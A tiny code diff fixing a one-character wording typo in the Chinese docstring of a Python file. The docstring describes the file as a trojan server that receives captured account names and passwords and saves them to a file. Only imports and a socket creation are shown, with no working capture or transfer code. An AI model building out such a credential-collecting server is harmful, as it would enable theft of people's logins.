@@ -3,7 +3,7 @@ import socket
 import datetime
 '''
 木马服务器
-接受木马监听到的账号和密码，存为文件
+接收木马监听到的账号和密码，存为文件
 '''
 sk = socket.socket()
 
